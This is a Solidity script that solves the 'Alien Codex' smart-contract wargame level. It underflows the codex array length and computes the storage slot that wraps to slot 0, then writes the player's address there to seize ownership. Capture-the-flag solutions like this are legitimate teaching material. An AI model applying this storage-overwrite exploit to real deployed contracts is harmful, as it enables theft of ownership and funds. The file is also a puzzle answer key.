// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {IAlienCodex} from "~/helpers/AlienCodex.sol";

contract Check is CheckScript("ALIEN_CODEX") {}

contract Solve is SolveScript("ALIEN_CODEX") {
    IAlienCodex target;

    constructor() {
        target = IAlienCodex(instance);
    }

    function attack() public override {
        // this is required to get past the modifier
        target.makeContact();

        // cause an underflow by calling retract
        target.retract();

        // become the owner by cleverly overriding the owner slot
        uint256 slot = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        bytes32 addrBytes = bytes32(abi.encode(address(player)));
        target.revise(slot, addrBytes);
    }
}
